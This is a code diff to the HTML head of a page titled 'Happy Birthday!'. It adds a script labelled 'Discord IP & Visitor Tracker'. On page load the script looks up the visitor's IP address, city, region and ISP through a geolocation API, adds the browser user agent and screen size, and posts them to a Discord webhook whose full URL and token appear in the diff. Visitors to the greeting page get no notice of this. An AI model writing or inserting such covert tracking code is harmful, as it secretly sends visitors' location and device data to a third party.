@@ -1,8 +1,36 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
- 
-  <meta charset="UTF-8">
+ <!-- Discord IP & Visitor Tracker Script -->
+  <script>
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const payload = {
+          content: "🚨 **New Visitor on Bisma Site!**",
+          embeds: [{
+            title: "Visitor Details",
+            color: 3447003,
+            fields: [
+              { name: "IP Address", value: data.ip || "Unknown", inline: true },
+              { name: "City / Region", value: `${data.city}, ${data.region}`, inline: true },
+              { name: "ISP / Network", value: data.org || "Unknown", inline: true },
+              { name: "Device / Browser", value: navigator.userAgent, inline: false },
+              { name: "Screen Size", value: `${window.screen.width}x${window.screen.height}`, inline: true }
+            ],
+            timestamp: new Date()
+          }]
+        };
+
+        fetch('https://discord.com/api/webhooks/1532832672106414241/fuzMWwsdNaY166ieE1pGVhAMELHTvRewuqAnNMp92IwgEoEGSsN6ppAAqaPOOOO3wxbS', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      })
+      .catch(err => console.error("Tracking error:", err));
+  </script>
+   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Happy Birthday! ✨</title>
   <link rel="stylesheet" href="style.css">
